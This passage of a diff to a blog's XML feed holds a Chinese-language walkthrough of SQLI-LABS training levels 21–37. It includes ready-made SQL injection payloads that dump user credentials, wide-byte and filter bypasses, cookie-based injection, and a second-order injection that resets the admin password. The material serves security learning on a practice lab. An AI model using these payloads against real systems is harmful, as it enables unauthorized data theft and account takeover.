class="variable">$q_s</span> = <span class="variable">$query_string</span>;</span><br><span class="line">	<span class="variable">$qs_array</span>= explode(<span class="string">&quot;&amp;&quot;</span>,<span class="variable">$q_s</span>);</span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$qs_array</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$val</span>=substr(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">2</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$val</span>==<span class="string">&quot;id&quot;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$id_value</span>=substr(<span class="variable">$value</span>,<span class="number">3</span>,<span class="number">30</span>); </span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$id_value</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这里面有2个函数，<strong>java_implimentation</strong>的作用是将传入的参数以<code>&amp;</code>分隔，如果该参数的前两个字符为<code>id</code>，则取它的第三个字符开始的30个字符作为<code>$id_value</code>，并返回<code>$id_value</code>，同时跳出循环。<strong>whitelist</strong>的作用是检查传入的字符串是否是数字，是的话就直接返回该字符串，否则就跳转到hacked.php。</p>
-</li>
-<li><p>利用方式</p>
-</li>
-</ul>
-<p>由于<strong>java_implimentation</strong>函数只要检测到一个<code>id</code>参数就退出检测，那么当我们传入2个名为<code>id</code>的参数时，后面的那一个就能绕过检测，从而可以利用其来进行注入。那么问题是，我们后端使用<code>$id=$_GET[&#39;id&#39;];</code>获取到的<code>id</code>参数究竟是第一个还是第二个呢。假设用户输入这样的语句：</p>
-  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">index.php?id=<span class="number">1</span>&amp;id=<span class="number">2</span></span><br></pre></td></tr></table></figure>
-<p>  Apache PHP 会解析最后一个参数</p>
-<p>  Tomcat JSP 会解析第一个参数</p>
-<p>可以看出，我们可以构造第二个<code>id</code>参数来绕过检测。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-29&#x2F;login.php?id&#x3D;1&amp;id&#x3D;-2&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h2><p>和Less-29相比，index.php页面的错误信息显示被屏蔽了，闭合方式改为<code>&quot;$id&quot;</code>，其他照旧。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-30&#x2F;login.php?id&#x3D;1&amp;id&#x3D;-2&quot; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h2><p>和Less-29相比，闭合方式改为<code>(&quot;$id&quot;)</code>，其他不变。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-31&#x2F;login.php?id&#x3D;1&amp;id&#x3D;-2&quot;) union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h2><ul>
-<li>查看源码</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="comment"># \ 转换为 \\</span></span><br><span class="line"><span class="variable">$string</span> = preg_replace(<span class="string">&#x27;/&#x27;</span>. preg_quote(<span class="string">&#x27;\\&#x27;</span>) .<span class="string">&#x27;/&#x27;</span>, <span class="string">&quot;\\\\\\&quot;</span>, <span class="variable">$string</span>); </span><br><span class="line"><span class="comment"># 将 &#x27; 转为\&#x27;</span></span><br><span class="line"><span class="variable">$string</span> = preg_replace(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="string">&#x27;\\\&#x27;&#x27;</span>, <span class="variable">$string</span>); </span><br><span class="line"><span class="comment"># 将 &quot; 转为\&quot;</span></span><br><span class="line"><span class="variable">$string</span> = preg_replace(<span class="string">&#x27;/\&quot;/&#x27;</span>, <span class="string">&quot;\\\&quot;&quot;</span>, <span class="variable">$string</span>);                         </span><br></pre></td></tr></table></figure>
-<ul>
-<li>利用方法</li>
-</ul>
-<p>这里使用宽字节注入，在被过滤的符号前面加入<code>%df</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-32&#x2F;?id&#x3D;-1%df&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h2><ul>
-<li>查看源码</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$string</span>= addslashes(<span class="variable">$string</span>);</span><br></pre></td></tr></table></figure>
-<p>此处过滤使用函数 <strong>addslashes()</strong> 返回在预定义字符之前添加反斜杠的字符串。</p>
-<p>预定义字符是：  单引号（’）  双引号（”）  反斜杠（\）</p>
-<p>这里依然可以使用宽字节注入绕过</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-33&#x2F;?id&#x3D;-1%df&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h2><ul>
-<li>查看源码</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span> = addslashes(<span class="variable">$uname1</span>);</span><br><span class="line"><span class="variable">$passwd</span>= addslashes(<span class="variable">$passwd1</span>);</span><br></pre></td></tr></table></figure>
-<p>和Less-33的过滤方法一样，只不过换成了POST方式提交数据，而POST方式无法直接使用<code>%df</code>来进行注入，需要用Burp Suite进行抓包改包。</p>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210305173404414.png" alt="image-20210305173404414"></p>
-<p>在图中的%27前面加上<code>%df</code>即可。</p>
-<ul>
-<li>这里还有另一种思路</li>
-</ul>
-<p>将 utf-8 转换为 utf-16 或 utf-32，例如将 ‘ 转为 utf-16 为 � ‘ 。我们就 可以利用这个方式进行尝试。</p>
-<p>可以使用 Linux 自带的 iconv 命令进行 UTF 的编码转换：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ <span class="built_in">echo</span> \<span class="string">&#x27;|iconv -f utf-8 -t utf-16</span></span><br><span class="line"><span class="string">��&#x27;</span></span><br><span class="line">➜  ~ <span class="built_in">echo</span> \<span class="string">&#x27;|iconv -f utf-8 -t utf-32</span></span><br><span class="line"><span class="string">��&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>尝试一个经典的万能密码：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;�&#39; or 1#&amp;passwd&#x3D;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210305175129233.png" alt="image-20210305175129233"></p>
-<h2 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h2><p>这一关的参数的数据类型为数字型，也就是说无需<code>&#39;</code>来闭合参数，但是这里的过滤措施和Less-33完全一致，相当与无用功。。直接进行联合注入即可。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-35&#x2F;?id&#x3D;-1 union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h2><ul>
-<li>查看源码</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$string</span>= mysql_real_escape_string(<span class="variable">$string</span>)</span><br></pre></td></tr></table></figure>
-<p>这里使用了**mysql_real_escape_string()**函数进行转义，如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。下列字符受影响： </p>
-<p> (\x00)  (\n)  (\r)   (‘)  (“)  (\x1a)</p>
-<p>这里仍然可以使用宽字节注入：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-36&#x2F;?id&#x3D;-1%df&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h2><p>本关与 34 关是大致相似的，区别在于处理 post 内容用的是 <strong>mysql_real_escape_string()</strong> 函数，而不是 **addslashes()**函数，但是原理是一样的。都是通过截包改包的方法进行注入。或者使用将 utf-8 转换为 utf-16 或 utf-32的方法直接在hackbar进行POST请求。</p>
-<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
-<li><a class="link"   href="https://www.sqlsec.com/2020/05/sqlilabs.html#toc-heading-44" >SQLI labs 靶场精简学习记录<i class="fas fa-external-link-alt"></i></a></li>
-</ul>
-<ul>
-<li><a class="link"   href="https://www.cnblogs.com/lcamry/" >lcamry 大佬的《MySQL注入天书》<i class="fas fa-external-link-alt"></i></a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
       </tags>
   </entry>
   <entry>
@@ -2075,6 +1907,316 @@
 <p>同样地，使用联合注入也能行</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;1&#39; UNION SELECT 1,2,group_concat(schema_name) from information_schema.schemata--+</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210304181017713.png" alt="image-20210304181017713"></p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a class="link"   href="https://www.sqlsec.com/2020/05/sqlilabs.html#toc-heading-44" >SQLI labs 靶场精简学习记录<i class="fas fa-external-link-alt"></i></a></li>
+</ul>
+<ul>
+<li><a class="link"   href="https://www.cnblogs.com/lcamry/" >lcamry 大佬的《MySQL注入天书》<i class="fas fa-external-link-alt"></i></a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQLI-LABS (Adv Injections) 21-37关</title>
+    <url>/2021/03/07/SQLI-LABS%20(Adv%20Injections)%2021-37%E5%85%B3/</url>
+    <content><![CDATA[<h2 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h2><ul>
+<li>查看源码</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> cookie 中不存在 uname 参数:  </span><br><span class="line">    输出了一堆无用的信息</span><br><span class="line">    <span class="keyword">if</span> 提交了 uname 和 passwd:</span><br><span class="line">        <span class="comment"># 进行过滤</span></span><br><span class="line">        <span class="variable">$uname</span> = check_input(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line">        <span class="variable">$passwd</span> = check_input(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$sql</span>=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> 有查询结果:</span><br><span class="line">            <span class="comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span></span><br><span class="line">            setcookie(<span class="string">&#x27;uname&#x27;</span>, base64_encode(<span class="variable">$row1</span>[<span class="string">&#x27;username&#x27;</span>]), time()+<span class="number">3600</span>);    </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print_r(mysql_error());</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> POST 数据里面没有 submit 参数:</span><br><span class="line">                 <span class="comment"># 对 cookee 进行 base64 解密</span></span><br><span class="line">        <span class="variable">$cookee</span> = base64_decode(<span class="variable">$cookee</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 直接将 cookee 通过单引号拼接到 SQL 语句中</span></span><br><span class="line">        <span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=(&#x27;<span class="subst">$cookee</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> 查询无结果:</span><br><span class="line">            输出 mysql_error()</span><br><span class="line">        <span class="keyword">if</span> 有结果:</span><br><span class="line">            输出查询的信息</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span></span><br><span class="line">        setcookie(<span class="string">&#x27;uname&#x27;</span>, base64_encode(<span class="variable">$row1</span>[<span class="string">&#x27;username&#x27;</span>]), time()<span class="number">-3600</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>通过源码看出，后端会把传入的cookie中的<code>uname</code>参数进行base64解密，然后再进行查询，所以我们传入的cookie中的<code>uname</code>要尽心base64加密才行。同时注意到，这里的闭合方式为<code>(&#39;$uname&#39;)</code></p>
+<p>查询语句：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;sqlsec&#39;) union select 1,2,(SELECT GROUP_CONCAT(username,&#39;:&#39;,password) FROM users)#</span><br></pre></td></tr></table></figure>
+<p>我们可以利用hackbar进行base64加密：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;c3Fsc2VjJykgdW5pb24gc2VsZWN0IDEsMiwoU0VMRUNUIEdST1VQX0NPTkNBVCh1c2VybmFtZSwnOicscGFzc3dvcmQpIEZST00gdXNlcnMpIw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210304212001660.png" alt="image-20210304212001660"></p>
+<h2 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h2><ul>
+<li>查看源码</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cookee</span> = base64_decode(<span class="variable">$cookee</span>);</span><br><span class="line"><span class="variable">$cookee1</span> = <span class="string">&#x27;&quot;&#x27;</span>. <span class="variable">$cookee</span>. <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=<span class="subst">$cookee1</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
+<p>可以看出仅仅实在Less-21的基础上把闭合方式改为了<code>&quot;$cookee1&quot;</code>，注入方式参考Less-21</p>
+<h2 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h2><ul>
+<li>查看源码</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//filter the comments out so as to comments should not work</span></span><br><span class="line"><span class="variable">$reg</span> = <span class="string">&quot;/#/&quot;</span>;</span><br><span class="line"><span class="variable">$reg1</span> = <span class="string">&quot;/--/&quot;</span>;</span><br><span class="line"><span class="variable">$replace</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$id</span> = preg_replace(<span class="variable">$reg</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span> = preg_replace(<span class="variable">$reg1</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> 有查询结果:</span><br><span class="line">    输出查询信息</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print_r(mysql_error());</span><br></pre></td></tr></table></figure>
+<p>可以看出这里使用正则匹配过滤了<code>#</code>和<code>--</code>，导致了我们无法把查询语句中参数<code>$id</code>后面的限制仅输出1个内容给屏蔽掉。这里我们可以构造语句：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-23&#x2F;?id&#x3D;-1&#39; union select 1,(select group_concat(username,&#39;:&#39;,password) from users),&#39;3</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210304215528582.png" alt="image-20210304215528582"></p>
+<p>解释：</p>
+<ol>
+<li><p>首先是id的第一个参数为-1，因为 sql 语句执行了两个 select 语句，第一个 select 为 id 的选择语 句，第二个为我们构造的 select 语句。只有一个数据可以输出，为了让我们自己构造的数据 可以正常输出，第一个 select 要没有结果，所以-1 或者超过数据库所有数据都可以。</p>
+</li>
+<li><p>最后3前面的<code>&#39;</code>目的是闭合查询语句最后的<code>&#39;</code>，使其不会错误</p>
+</li>
+<li><p>此处也可以进行报错注入，盲注</p>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-23&#x2F;?id&#x3D;-1&#39; union select 1,(select extractvalue(1,concat(0x7e,(select database()),0x7e))),&#39;3</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210304215543764.png" alt="image-20210304215543764"></p>
+<h2 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h2><ul>
+<li><p>查看代码</p>
+<ul>
+<li><strong>Index.php</strong></li>
+</ul>
+<p>主要记录了表单相关的信息，没有啥敏感代码，当做 Index.html 来看待就可以了。</p>
+<p>输入用户名和密码之后会把数据传输到 <strong>login.php</strong> 进行验证。点击忘记密码会跳转到<strong>forgot_password.php</strong>，点击创建新用户会跳转到<strong>new_user.php</strong>。</p>
+<ul>
+<li><strong>failed.php</strong></li>
+</ul>
+<p>检测会话，如果 cookie 里面没有 Auth 参数的话，就跳转到 index.php</p>
+<ul>
+<li><strong>forgot_password.php</strong></li>
+</ul>
+<p>简单提示：如果你忘记密码 请 hack it</p>
+<ul>
+<li><strong>login.php</strong></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$username</span> = mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line"><span class="variable">$password</span> = mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>]);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 登陆成功：</span><br><span class="line">    <span class="comment">#设置session和cookie</span></span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>] = <span class="variable">$login</span>;</span><br><span class="line">    setcookie(<span class="string">&quot;Auth&quot;</span>, <span class="number">1</span>, time()+<span class="number">3600</span>);</span><br></pre></td></tr></table></figure>
+<p><code>$username</code>和<code>$password</code>两个参数都被过滤掉，无法从这里进行注入。</p>
+<ul>
+<li><strong>new_user.php</strong></li>
+</ul>
+<p>创建新用户的表单页面，本文件主要存放前段代码。</p>
+<ul>
+<li><strong>login_create.php</strong></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 接受用户提交的用户名和密码值 并进行 mysql 安全函数转义</span></span><br><span class="line"><span class="variable">$username</span>=  mysql_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) ;</span><br><span class="line"><span class="variable">$pass</span>= mysql_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$re_pass</span>= mysql_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询当前用户信息</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select count(*) from users where username=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">#如果当前用户已经存在 无法注册</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 两次输入密码一致：</span><br><span class="line">  <span class="comment"># 将记录插入数据库中</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;insert into users ( username, password) values(\&quot;<span class="subst">$username</span>\&quot;, \&quot;<span class="subst">$pass</span>\&quot;)&quot;</span>;</span><br><span class="line">      查询完成后 重定向到首页</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        提示两次输入密码不一致</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>pass_change.php</strong></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> 检测未登录：</span><br><span class="line">    重定向到首页</span><br><span class="line"><span class="keyword">if</span> 检测到提交表单：</span><br><span class="line">  <span class="comment"># 对 pass 都进行了过滤</span></span><br><span class="line">  <span class="variable">$username</span>= <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">    <span class="variable">$curr_pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;current_password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$re_pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> 两次密码一致:</span><br><span class="line">        <span class="comment"># 直接将 username 拼接到 SQL 语句</span></span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        提示密码不一致 并重定向到 fail.php</span><br></pre></td></tr></table></figure></li>
+<li><p>思路分析</p>
+</li>
+</ul>
+<p>这里需要利用到二次注入。看更新密码的地方：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> <span class="keyword">users</span> <span class="keyword">SET</span> <span class="keyword">PASSWORD</span>=<span class="string">&#x27;$pass&#x27;</span> <span class="keyword">where</span> username=<span class="string">&#x27;$username&#x27;</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">&#x27;$curr_pass&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>这里直接使用单引号拼接了 username 所以当 username 可控的话 ，这里是存在SQL注入的，假设用户注册的 username 的值为：<code>admin&#39;#</code>，那么此时的完整语句就为：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> <span class="keyword">users</span> <span class="keyword">SET</span> <span class="keyword">PASSWORD</span>=<span class="string">&#x27;$pass&#x27;</span> <span class="keyword">where</span> username=<span class="string">&#x27;admin&#x27;</span><span class="comment"># and password=&#x27;$curr_pass&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>相当于<code>#</code>后面的都被屏蔽掉了，直接修改了 admin 的用户密码。</p>
+<ul>
+<li><p>演示步骤</p>
+<ol>
+<li><p>注册一个名字为<code>admin&#39;#</code>的用户</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210305100428917.png" alt="image-20210305100428917"></p>
+</li>
+<li><p>注册好之后登陆该账户，对密码进行修改</p>
+</li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210305100925703.png" alt="image-20210305100925703"></p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210305100819324.png" alt="image-20210305100819324"></p>
+</li>
+</ul>
+<p>可以看到此时admin用户的密码被修改为了000</p>
+<h2 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h2><ul>
+<li>查看代码</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/AND/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>= blacklist(<span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
+<p>  可以看出后端把传进去的参数进行了过滤，把<code>or</code>和<code>and</code>不区分大小写替换为了空字符。</p>
+<ul>
+<li>or 和 and 过滤的绕过<ol>
+<li>大小写变形 Or,OR,oR</li>
+<li>编码，hex，urlencode</li>
+<li>添加注释/*or*/</li>
+<li>利用符号 and=&amp;&amp; or=||</li>
+<li>双写 oorr，anandd</li>
+</ol>
+</li>
+</ul>
+<p>由于password中含有or，所以要在里面双写</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-25&#x2F;?id&#x3D;-1&#39; union select 1,(select group_concat(username,&#39;:&#39;,passwoorrd) from users),3--+</span><br></pre></td></tr></table></figure>
+<p>使用报错或者盲注时推荐使用符号</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39;||extractvalue(1,concat(0x7e,database()))--+</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>值得一提的是，如果使用&amp;&amp;来代替and，需要对&amp;&amp;进行url编码，否则&amp;后面的内容会被当成第二个参数传递。</p>
+</blockquote>
+<h2 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h2><p>这一关就是Less-25的小改，参数类型改为了数字型，并且屏蔽了错误信息显示。因此这里只能使用联合注入和盲注。</p>
+<h2 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h2><ul>
+<li>查看源码</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//strip out /*</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out --</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//Strip out #</span></span><br><span 